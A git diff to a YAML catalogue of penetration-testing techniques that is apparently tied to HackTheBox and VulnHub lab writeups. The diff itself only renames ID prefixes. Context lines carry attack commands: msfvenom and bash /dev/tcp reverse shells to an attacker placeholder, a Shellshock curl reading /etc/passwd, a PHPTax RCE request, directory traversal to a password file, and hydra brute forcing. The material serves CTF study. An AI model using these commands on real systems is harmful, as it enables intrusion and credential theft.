@@ -3335,7 +3335,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       enumerate_app_prtg:
         cli: "default credentials:\n  prtgadmin/prtgadmin\nconfiguration and backup\
@@ -3457,7 +3457,7 @@ summary:
           - exploit_credsreuse
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/48
-          verbose_id: hackthebox#48
+          verbose_id: htb#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf
         - datetime: 20190909
           infra: VulnHub
@@ -3477,7 +3477,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
         - datetime: 20190910
           infra: VulnHub
@@ -3493,7 +3493,7 @@ summary:
           - privesc_sudo
           - privesc_nmap
           url: https://www.vulnhub.com/entry/dc-6,315/
-          verbose_id: vulnhub#315
+          verbose_id: vh#315
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf
         - datetime: 20191029
           infra: VulnHub
@@ -3511,7 +3511,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
         - datetime: 20190918
           infra: VulnHub
@@ -3528,7 +3528,7 @@ summary:
           - privesc_mysql_creds
           - privesc_credsreuse
           url: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
-          verbose_id: vulnhub#180
+          verbose_id: vh#180
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf
       enumerate_nmap_initial:
         cli: 'sudo nmap -Pn -sC -sV -O -oN initial <attackerip>
@@ -3626,7 +3626,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
       enumerate_proto_http:
         cli: 'bash /usr/share/sparta/scripts/x11screenshot.sh <targetip>
@@ -3703,7 +3703,7 @@ summary:
           - privesc_sudo
           - privesc_cron_rootjobs
           url: https://www.hackthebox.eu/home/machines/profile/118
-          verbose_id: hackthebox#118
+          verbose_id: htb#118
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf
         - datetime: 20190909
           infra: VulnHub
@@ -3723,7 +3723,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
         - datetime: 20200810
           infra: VulnHub
@@ -3737,7 +3737,7 @@ summary:
           - exploit_ssh_privatekeys
           - privesc_lxc_bash
           url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
-          verbose_id: vulnhub#508
+          verbose_id: vh#508
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
       enumerate_proto_ldap:
         cli: 'ldapsearch -x -s base -h <targetip> -p 389
@@ -3905,7 +3905,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       enumerate_proto_smb_anonymous_access:
         cli: "# connect to and explore smb share:\n  smbclient -N -L \\\\\\\\<targetip>\n\
@@ -3937,7 +3937,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       enumerate_proto_smtp:
         cli: "smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt\
@@ -3997,7 +3997,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       enumerate_proto_sql_ssis_dtsconfig:
         cli: 'cat *.dtsConfig
@@ -4027,7 +4027,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       enumerate_proto_ssh:
         cli: "authorized_keys:\n  ssh-keygen -t rsa -b 2048\n    enter a custom filename\n\
@@ -4060,7 +4060,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
       enumerate_proto_telnet:
         cli: "nmap -p 23 --script telnet-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/unix_users,passdb=/usr/share/wordlists/rockyou.txt,telnet-brute.timeout=20s\
@@ -4140,7 +4140,7 @@ summary:
           - privesc_sudoers
           - privesc_passwd_writable
           url: https://www.vulnhub.com/entry/misdirection-1,371/
-          verbose_id: vulnhub#371
+          verbose_id: vh#371
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf
       exploit_bof:
         cli: ''
@@ -4160,7 +4160,7 @@ summary:
           - privesc_anansi
           - privesc_sudo
           url: https://www.vulnhub.com/entry/brainpan-1,51/
-          verbose_id: vulnhub#51
+          verbose_id: vh#51
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf
       exploit_cloudme_bof:
         cli: 'msfvenom -p windows/shell_reverse_tcp lhost=<attackerip> lport=<attackerport>
@@ -4198,7 +4198,7 @@ summary:
           - exploit_cmdexec
           - privesc_kernel_ipappend
           url: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
-          verbose_id: vulnhub#23
+          verbose_id: vh#23
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf
       exploit_coldfusion_dirtraversal:
         cli: 'http://<targetip>:<targetport>/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
@@ -4249,7 +4249,7 @@ summary:
           - exploit_credsreuse
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/48
-          verbose_id: hackthebox#48
+          verbose_id: htb#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf
         - datetime: 20191008
           infra: VulnHub
@@ -4265,7 +4265,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
-          verbose_id: vulnhub#25
+          verbose_id: vh#25
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf
         - datetime: 20191029
           infra: VulnHub
@@ -4283,7 +4283,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
         - datetime: 20191010
           infra: VulnHub
@@ -4299,7 +4299,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/lord-of-the-root-101,129/
-          verbose_id: vulnhub#129
+          verbose_id: vh#129
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf
         - datetime: 20191028
           infra: VulnHub
@@ -4314,7 +4314,7 @@ summary:
           - exploit_mongodb
           - privesc_setuid
           url: https://www.vulnhub.com/entry/node-1,252/
-          verbose_id: vulnhub#252
+          verbose_id: vh#252
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf
       exploit_defaultcreds:
         cli: ''
@@ -4332,7 +4332,7 @@ summary:
           - exploit_defaultcreds
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/64
-          verbose_id: hackthebox#64
+          verbose_id: htb#64
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.mirai/writeup.pdf
       exploit_drupal_passwordcrack:
         cli: 'hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
@@ -4360,7 +4360,7 @@ summary:
           - exploit_iis_asp_reverseshell
           - privesc_windows_ms11_046
           url: https://www.hackthebox.eu/home/machines/profile/3
-          verbose_id: hackthebox#3
+          verbose_id: htb#3
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf
       exploit_ftp_web_root:
         cli: ''
@@ -4383,7 +4383,7 @@ summary:
           - exploit_iis_asp_reverseshell
           - privesc_windows_ms11_046
           url: https://www.hackthebox.eu/home/machines/profile/3
-          verbose_id: hackthebox#3
+          verbose_id: htb#3
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf
       exploit_gpp_groupsxml:
         cli: "smbclient //10.10.10.100/Replication\nget ..\\\\active.htb\\Policies\\\
@@ -4428,7 +4428,7 @@ summary:
           - exploit_hfs_cmd_exec
           - privesc_windows_ms16_098
           url: https://www.hackthebox.eu/home/machines/profile/6
-          verbose_id: hackthebox#6
+          verbose_id: htb#6
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.optimum/writeup.pdf
       exploit_iis_asp_reverseshell:
         cli: 'msfvenom -p windows/shell/reverse_tcp LHOST=<attackerip> LPORT=<attackerport>
@@ -4458,7 +4458,7 @@ summary:
           - exploit_iis_asp_reverseshell
           - privesc_windows_ms11_046
           url: https://www.hackthebox.eu/home/machines/profile/3
-          verbose_id: hackthebox#3
+          verbose_id: htb#3
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.devel/writeup.pdf
       exploit_iis_webdav:
         cli: "msfconsole\n  use windows/iis/iis_webdav_scstoragepathfromurl\n    set\
@@ -4483,7 +4483,7 @@ summary:
           - exploit_iis_webdav
           - privesc_windows_ms14_070
           url: https://www.hackthebox.eu/home/machines/profile/13
-          verbose_id: hackthebox#13
+          verbose_id: htb#13
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.grandpa/writeup.pdf
         - datetime: 20191104
           infra: HackTheBox
@@ -4496,7 +4496,7 @@ summary:
           - exploit_iis_webdav
           - privesc_windows_ms15_051
           url: https://www.hackthebox.eu/home/machines/profile/14
-          verbose_id: hackthebox#14
+          verbose_id: htb#14
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.granny/writeup.pdf
       exploit_lotuscms:
         cli: 'nc -nlvp <attackerport>
@@ -4520,7 +4520,7 @@ summary:
           - privesc_sudoers
           - privesc_sudo
           url: https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
-          verbose_id: vulnhub#24
+          verbose_id: vh#24
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix3/writeup.pdf
       exploit_modssl:
         cli: "gcc -o 47080 47080.c -lcrypto\n./47080\n  0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n\
@@ -4541,7 +4541,7 @@ summary:
           - exploit_modssl
           - privesc_modssl
           url: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
-          verbose_id: vulnhub#22
+          verbose_id: vh#22
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix1/writeup.pdf
       exploit_mongodb:
         cli: "nc -nlvp <attackerport>\n  mongo -p -u <user> <record>\n    db.tasks.insert({\"\
@@ -4563,7 +4563,7 @@ summary:
           - exploit_mongodb
           - privesc_setuid
           url: https://www.vulnhub.com/entry/node-1,252/
-          verbose_id: vulnhub#252
+          verbose_id: vh#252
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf
       exploit_nfs_rw:
         cli: "check available mountpoints\nmount file system via nfs v3\ncheck uid\
@@ -4603,7 +4603,7 @@ summary:
           - privesc_strace_setuid
           - privesc_docker_group
           url: https://www.vulnhub.com/entry/linsecurity-1,244/
-          verbose_id: vulnhub#244
+          verbose_id: vh#244
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf
         - datetime: 20190920
           infra: VulnHub
@@ -4618,7 +4618,7 @@ summary:
           - privesc_nfs_norootsquash
           - privesc_ssh_authorizedkeys
           url: https://www.vulnhub.com/entry/hacklab-vulnix,48/
-          verbose_id: vulnhub#48
+          verbose_id: vh#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf
       exploit_nodejs:
         cli: ''
@@ -4639,7 +4639,7 @@ summary:
           - exploit_mongodb
           - privesc_setuid
           url: https://www.vulnhub.com/entry/node-1,252/
-          verbose_id: vulnhub#252
+          verbose_id: vh#252
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.node1/writeup.pdf
       exploit_nodejs_deserialize:
         cli: ''
@@ -4672,7 +4672,7 @@ summary:
           - exploit_phptax
           - privesc_freebsd
           url: https://www.vulnhub.com/entry/kioptrix-2014-5,62/
-          verbose_id: vulnhub#62
+          verbose_id: vh#62
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf
       exploit_pfsense:
         cli: 'python3 43560.py --rhost <targetip> --lhost <attackerip> --lport <attackerport>
@@ -4720,7 +4720,7 @@ summary:
           - privesc_sudo
           - privesc_setuid
           url: https://www.vulnhub.com/entry/fristileaks-13,133/
-          verbose_id: vulnhub#133
+          verbose_id: vh#133
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf
         - datetime: 20190927
           infra: VulnHub
@@ -4734,7 +4734,7 @@ summary:
           - exploit_php_reverseshell
           - privesc_setuid
           url: https://www.vulnhub.com/entry/hackme-1,330/
-          verbose_id: vulnhub#330
+          verbose_id: vh#330
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf
         - datetime: 20190919
           infra: VulnHub
@@ -4750,7 +4750,7 @@ summary:
           - privesc_cron
           - privesc_bash_reverseshell
           url: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
-          verbose_id: vulnhub#181
+          verbose_id: vh#181
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf
       exploit_php_fileupload_bypass:
         cli: 'cp /usr/share/webshells/php/php-reverse-shell.php ./rs.php.gif
@@ -4789,7 +4789,7 @@ summary:
           - privesc_sudo
           - privesc_setuid
           url: https://www.vulnhub.com/entry/fristileaks-13,133/
-          verbose_id: vulnhub#133
+          verbose_id: vh#133
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.fristileaks1dot3/writeup.pdf
         - datetime: 20190926
           infra: VulnHub
@@ -4802,7 +4802,7 @@ summary:
           - exploit_php_fileupload_bypass
           - privesc_bof
           url: https://www.vulnhub.com/entry/imf-1,162/
-          verbose_id: vulnhub#162
+          verbose_id: vh#162
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf
       exploit_php_reverseshell:
         cli: ''
@@ -4828,7 +4828,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
         - datetime: 20190927
           infra: VulnHub
@@ -4842,7 +4842,7 @@ summary:
           - exploit_php_reverseshell
           - privesc_setuid
           url: https://www.vulnhub.com/entry/hackme-1,330/
-          verbose_id: vulnhub#330
+          verbose_id: vh#330
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.hackme/writeup.pdf
         - datetime: 20191029
           infra: VulnHub
@@ -4860,7 +4860,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
         - datetime: 20191021
           infra: VulnHub
@@ -4874,7 +4874,7 @@ summary:
           - privesc_setuid
           - privesc_nmap
           url: https://www.vulnhub.com/entry/mr-robot-1,151/
-          verbose_id: vulnhub#151
+          verbose_id: vh#151
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.mrrobot1/writeup.pdf
         - datetime: 20190918
           infra: VulnHub
@@ -4891,7 +4891,7 @@ summary:
           - privesc_mysql_creds
           - privesc_credsreuse
           url: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
-          verbose_id: vulnhub#180
+          verbose_id: vh#180
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf
         - datetime: 20190919
           infra: VulnHub
@@ -4907,7 +4907,7 @@ summary:
           - privesc_cron
           - privesc_bash_reverseshell
           url: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
-          verbose_id: vulnhub#181
+          verbose_id: vh#181
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf
       exploit_php_webshell:
         cli: ''
@@ -4928,7 +4928,7 @@ summary:
           - privesc_sudoers
           - privesc_passwd_writable
           url: https://www.vulnhub.com/entry/misdirection-1,371/
-          verbose_id: vulnhub#371
+          verbose_id: vh#371
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.misdirection1/writeup.pdf
       exploit_phptax:
         cli: "GET /phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E\
@@ -4952,7 +4952,7 @@ summary:
           - exploit_phptax
           - privesc_freebsd
           url: https://www.vulnhub.com/entry/kioptrix-2014-5,62/
-          verbose_id: vulnhub#62
+          verbose_id: vh#62
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix5/writeup.pdf
       exploit_prtg_sensors:
         cli: './46527.sh -u http://<targetip> -c "<prtg session cookie>"
@@ -5002,7 +5002,7 @@ summary:
           - privesc_sudo
           - privesc_cron_rootjobs
           url: https://www.hackthebox.eu/home/machines/profile/118
-          verbose_id: hackthebox#118
+          verbose_id: htb#118
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.bashed/writeup.pdf
         - datetime: 20190917
           infra: VulnHub
@@ -5016,7 +5016,7 @@ summary:
           - privesc_mysql_creds
           - privesc_setuid
           url: https://www.vulnhub.com/entry/escalate_linux-1,323/
-          verbose_id: vulnhub#323
+          verbose_id: vh#323
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.escalatelinux/writeup.pdf
       exploit_shellshock:
         cli: 'curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c ''cat /etc/passwd''"
@@ -5043,7 +5043,7 @@ summary:
           - exploit_shellshock
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/108
-          verbose_id: hackthebox#108
+          verbose_id: htb#108
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.shocker/writeup.pdf
       exploit_smb_ms08_067:
         cli: "scan:\n  nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1\
@@ -5079,7 +5079,7 @@ summary:
           tags:
           - exploit_smb_ms08_067
           url: https://www.hackthebox.eu/home/machines/profile/2
-          verbose_id: hackthebox#2
+          verbose_id: htb#2
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.legacy/writeup.pdf
       exploit_smb_ms17_010:
         cli: "nmap -p 445 -script smb-check-vulns -script-args=unsafe=1 <targetip>\n\
@@ -5110,7 +5110,7 @@ summary:
           tags:
           - exploit_smb_ms17_010
           url: https://www.hackthebox.eu/home/machines/profile/51
-          verbose_id: hackthebox#51
+          verbose_id: htb#51
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.blue/writeup.pdf
       exploit_smb_nullsession:
         cli: ''
@@ -5135,7 +5135,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
       exploit_smb_usermap:
         cli: 'nc -nlvp <attackerport>
@@ -5166,7 +5166,7 @@ summary:
           tags:
           - exploit_smb_usermap
           url: https://www.hackthebox.eu/home/machines/profile/1
-          verbose_id: hackthebox#1
+          verbose_id: htb#1
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.lame/writeup.pdf
       exploit_smb_web_root:
         cli: ''
@@ -5192,7 +5192,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
       exploit_sql_login:
         cli: 'mssqlclient.py -windows-auth "<username>@<targetip>"
@@ -5218,7 +5218,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       exploit_sql_xpcmdshell:
         cli: "SELECT IS_SRVROLEMEMBER('sysadmin') ## check if current sql user has\
@@ -5252,7 +5252,7 @@ summary:
           - enumerate_app_powershell_history
           - privesc_psexec_login
           url: https://www.hackthebox.eu/home/start
-          verbose_id: hackthebox#archetype
+          verbose_id: htb#archetype
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.archetype/writeup.pdf
       exploit_sqli:
         cli: 'sqlmap -u "http://<targetip>:<targetport>/<vulnwebapp>/index.php" --batch
@@ -5273,7 +5273,7 @@ summary:
           - exploit_sqli
           - privesc_cron
           url: https://www.hackthebox.eu/home/machines/profile/11
-          verbose_id: hackthebox#11
+          verbose_id: htb#11
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.cronos/writeup.pdf
         - datetime: 20190928
           infra: VulnHub
@@ -5287,7 +5287,7 @@ summary:
           - exploit_cmdexec
           - privesc_kernel_ipappend
           url: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/
-          verbose_id: vulnhub#23
+          verbose_id: vh#23
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix2/writeup.pdf
         - datetime: 20191008
           infra: VulnHub
@@ -5303,7 +5303,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/
-          verbose_id: vulnhub#25
+          verbose_id: vh#25
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.kioptrix4/writeup.pdf
         - datetime: 20191010
           infra: VulnHub
@@ -5319,7 +5319,7 @@ summary:
           - privesc_mysql_root
           - privesc_mysql_udf
           url: https://www.vulnhub.com/entry/lord-of-the-root-101,129/
-          verbose_id: vulnhub#129
+          verbose_id: vh#129
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lordoftheroot101/writeup.pdf
       exploit_ssh_authorizedkeys:
         cli: ''
@@ -5340,7 +5340,7 @@ summary:
           - privesc_strace_setuid
           - privesc_docker_group
           url: https://www.vulnhub.com/entry/linsecurity-1,244/
-          verbose_id: vulnhub#244
+          verbose_id: vh#244
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.linsecurity1/writeup.pdf
         - datetime: 20190920
           infra: VulnHub
@@ -5355,7 +5355,7 @@ summary:
           - privesc_nfs_norootsquash
           - privesc_ssh_authorizedkeys
           url: https://www.vulnhub.com/entry/hacklab-vulnix,48/
-          verbose_id: vulnhub#48
+          verbose_id: vh#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.vulnix/writeup.pdf
       exploit_ssh_bruteforce:
         cli: 'hydra -l anne -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 ssh://<targetip>
@@ -5382,7 +5382,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
       exploit_ssh_privatekeys:
         cli: ''
@@ -5401,7 +5401,7 @@ summary:
           - exploit_ssh_privatekeys
           - privesc_lxc_bash
           url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
-          verbose_id: vulnhub#508
+          verbose_id: vh#508
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.infosecpreposcp/writeup.pdf
       exploit_ssl_heartbleed:
         cli: 'nmap --script=ssl-heartbleed -p <targetport> <targetip>
@@ -5437,7 +5437,7 @@ summary:
           - privesc_mysql_creds
           - privesc_credsreuse
           url: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
-          verbose_id: vulnhub#180
+          verbose_id: vh#180
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf
       exploit_wordpress_plugin:
         cli: ''
@@ -5458,7 +5458,7 @@ summary:
           - exploit_credsreuse
           - privesc_sudoers
           url: https://www.hackthebox.eu/home/machines/profile/48
-          verbose_id: hackthebox#48
+          verbose_id: htb#48
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.blocky/writeup.pdf
       exploit_wordpress_plugin_activitymonitor:
         cli: ''
@@ -5481,7 +5481,7 @@ summary:
           - privesc_sudo
           - privesc_nmap
           url: https://www.vulnhub.com/entry/dc-6,315/
-          verbose_id: vulnhub#315
+          verbose_id: vh#315
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.dc6/writeup.pdf
       exploit_wordpress_plugin_hellodolly:
         cli: ''
@@ -5508,7 +5508,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
           url: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
-          verbose_id: vulnhub#231
+          verbose_id: vh#231
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.bsidesvancouver2018workshop/writeup.pdf
         - datetime: 20190918
           infra: VulnHub
@@ -5525,7 +5525,7 @@ summary:
           - privesc_mysql_creds
           - privesc_credsreuse
           url: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
-          verbose_id: vulnhub#180
+          verbose_id: vh#180
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf
       exploit_wordpress_template:
         cli: ''
@@ -5549,7 +5549,7 @@ summary:
           - exploit_wordpress_template
           - privesc_sudo
           url: https://www.vulnhub.com/entry/lazysysadmin-1,205/
-          verbose_id: vulnhub#205
+          verbose_id: vh#205
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.lazysysadmin1/writeup.pdf
     privesc:
       privesc_anansi:
@@ -5571,7 +5571,7 @@ summary:
           - privesc_anansi
           - privesc_sudo
           url: https://www.vulnhub.com/entry/brainpan-1,51/
-          verbose_id: vulnhub#51
+          verbose_id: vh#51
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.brainpan/writeup.pdf
       privesc_bash_reverseshell:
         cli: 'bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
@@ -5596,7 +5596,7 @@ summary:
           - privesc_cron
           - privesc_bash_reverseshell
           url: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
-          verbose_id: vulnhub#181
+          verbose_id: vh#181
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf
       privesc_bof:
         cli: ''
@@ -5615,7 +5615,7 @@ summary:
           - exploit_php_fileupload_bypass
           - privesc_bof
           url: https://www.vulnhub.com/entry/imf-1,162/
-          verbose_id: vulnhub#162
+          verbose_id: vh#162
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.imf/writeup.pdf
       privesc_chkrootkit:
         cli: ''
@@ -5636,7 +5636,7 @@ summary:
           - privesc_cron
           - privesc_bash_reverseshell
           url: https://www.vulnhub.com/entry/hackfest2016-sedna,181/
-          verbose_id: vulnhub#181
+          verbose_id: vh#181
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.sedna/writeup.pdf
       privesc_credsreuse:
         cli: ''
@@ -5658,7 +5658,7 @@ summary:
           - privesc_mysql_creds
           - privesc_credsreuse
           url: https://www.vulnhub.com/entry/hackfest2016-quaoar,180/
-          verbose_id: vulnhub#180
+          verbose_id: vh#180
           writeup: https://github.com/7h3rAm/writeups/blob/master/vulnhub.quaoar/writeup.pdf
       privesc_cron:
         cli: 'crontab -l
@@ -5680,7 +5680,7 @@ summary:
           - exploit_sqli
           - privesc_cron
           url: https://www.hackthebox.eu/home/machines/profile/11
-          verbose_id: hackthebox#11
+          verbose_id: htb#11
           writeup: https://github.com/7h3rAm/writeups/blob/master/htb.cronos/writeup.pdf
         - datetime: 20190905
           infra: VulnHub
@@ -5694,7 +5694,7 @@ summary:
           - privesc_cron
           - privesc_sudoers
